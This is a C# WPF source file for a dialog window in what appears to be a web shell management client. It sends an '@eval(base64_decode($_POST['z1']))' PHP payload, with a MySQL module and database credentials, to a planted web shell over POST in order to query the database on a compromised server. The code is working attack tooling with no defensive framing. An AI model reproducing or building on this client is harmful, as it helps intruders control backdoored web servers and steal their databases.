using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using WpfApp1.Payload.php;
using WpfApp1.Utli;

namespace WpfApp1.UI
{
    /// <summary>
    /// DbAdd.xaml 的交互逻辑
    /// </summary>
    public partial class DbAdd : Window
    {
        /// <summary>
        /// 连接shell 地址
        /// </summary>
        public string shell { get; set; }
        /// <summary>
        /// shell密码
        /// </summary>
        public string Passwords { get; set; }

        /// <summary>
        /// 获取请求的数据
        /// </summary>
        /// <param name="value"></param>
        public delegate void SendMessage(string value);
        public SendMessage sendMessage;

        public delegate void SendMok(string s);
        public SendMok sendMok;

        /// <summary>
        /// 引入payload
        /// </summary>
        MysqlDB mysqlDB = new MysqlDB();

        /// <summary>
        /// 引入post请求
        /// </summary>
        Post post = new Post();

        public DbAdd()
        {
            InitializeComponent();
        }
        /// <summary>
        /// 点击测试 按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Connect_Click(object sender, RoutedEventArgs e)
        {

            if (Database_type.Text =="MYSQLI")
            {
                string z1 = "@eval(base64_decode($_POST['z1']));";
                string p = z1 + "&z1=" + mysqlDB.info() + "&ea677d45407e6=" + address.Text + "&d3cee540af43ff=" + user.Text + "&q20565d9e23ec7=" + Password.Text;
                string rsults = Post.Postring(shell, new Dictionary<string, string> { { Passwords, p }, });

                
                if (rsults.Length > 0)
                {
                    MessageBox.Show("连接成功");
                    sendMessage(rsults);
                }
                else
                {
                   
                    MessageBox.Show("返回数据为空", "警告！", MessageBoxButton.OK, MessageBoxImage.Error);
                    sendMessage("返回数据为空");
                }

            }
            else
            {
                MessageBox.Show("选择的不是mysql,暂时 只有mysql");
            }
        }



    }
}
